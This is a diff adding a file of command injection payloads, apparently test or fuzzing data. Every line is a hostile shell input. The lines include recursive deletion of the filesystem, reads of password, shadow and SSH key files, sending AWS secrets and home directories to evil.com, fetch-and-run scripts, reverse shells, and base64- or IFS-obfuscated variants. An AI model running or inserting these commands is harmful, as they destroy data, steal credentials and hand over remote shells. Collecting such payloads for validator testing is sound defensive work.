@@ -1,0 +1,26 @@
+# Command injection payloads
+; rm -rf /
+&& curl attacker.com/shell.sh | bash
+| nc attacker.com 4444 -e /bin/sh
+$(curl http://evil.com/payload)
+`wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd`
+; cat /etc/passwd
+&& echo $AWS_SECRET_ACCESS_KEY | curl -d @- http://evil.com
+|| cat ~/.ssh/id_rsa > /tmp/key && curl -F file=@/tmp/key http://evil.com
+; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])'
+$(echo cm0gLXJmIC8= | base64 -d)
+;bash -c '{echo,Y3VybCBldmlsLmNvbQ==}|{base64,-d}|bash'
+\n;id\n
+%0a;id%0a
+`id`
+a]]; rm -rf / #
+'; DROP TABLE users; --
+&& tar czf - /home | curl -X POST -d @- https://evil.com/exfil
+; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.com 1234 > /tmp/f
+bash -c '{rm,-rf,/}'
+{rm,-rf,/}
+sh -c "{rm,-rf,~}"
+rm${IFS}-rf${IFS}/
+cat${IFS}/etc/passwd
+{cat,/etc/shadow}
+X=$'\x72\x6d';$X -rf /
